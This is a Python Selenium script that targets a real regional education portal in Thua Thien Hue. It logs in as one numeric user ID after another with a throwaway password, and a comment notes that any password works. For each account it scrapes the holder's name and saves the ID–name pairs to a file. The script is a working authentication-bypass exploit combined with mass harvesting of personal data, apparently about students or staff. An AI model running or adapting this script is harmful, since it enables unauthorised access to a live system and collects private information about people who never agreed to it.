from dotenv import dotenv_values
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from bs4 import BeautifulSoup
import minify_html
import lxml
import lxml.html.clean as clean
import pandas as pd
import colorama
from colorama import Fore
from time import sleep

config = dotenv_values(".env")
for index in config: 
    if not config[index] in ["true", "false"]: config[index] = int(config[index])

def login(inp_uid):
    uid = driver.find_element(By.ID, "txtUser")
    uid.send_keys(inp_uid)
    passwd = driver.find_element(By.ID, "txtPass")
    passwd.send_keys("cc") # [CONFIG] Anything will work...
    login_btn = driver.find_element(By.ID, "btnDangNhap")
    login_btn.send_keys(Keys.ENTER)
def clean_attrib(html_str):
    cleaner = clean.Cleaner(safe_attrs_only=True, safe_attrs=frozenset({'colspan'})) # Keep 'colspan' safe.
    return cleaner.clean_html(html_str)
def logout(): driver.find_element(By.ID, "LinkButton2").click()
colorama.init()

chrome_options = Options()
chrome_options.add_argument("--disable-logging")
chrome_options.add_argument("--log-level=3") 
chrome_options.add_argument("--disable-extension")
chrome_options.add_argument("--disable-in-process-stack-traces")
driver = webdriver.Chrome(options=chrome_options)
driver.get("https://qlttgddt.thuathienhue.edu.vn/home/dangnhap.aspx")
file_name = open("./collected/UIDs and names.txt", "a", encoding="utf-8")

for user_id in range(config["start_UIDs"], config["end_UIDs"]):
    login(user_id)
    name_raw = driver.find_element(By.XPATH,"//span[@id='lblTenTaiKhoan']/span").get_attribute('outerHTML')
    name = BeautifulSoup(name_raw, "lxml").string
    
    if name is not None: 
        file_name.write(str(user_id) + " - " + name + "\n")
        print(f"{Fore.LIGHTGREEN_EX}UID {user_id} with the name {name} has been saved.{Fore.WHITE}")
    else: file_name.write(str(user_id) + " - null\n")
    logout()
file_name.close()
sleep(10)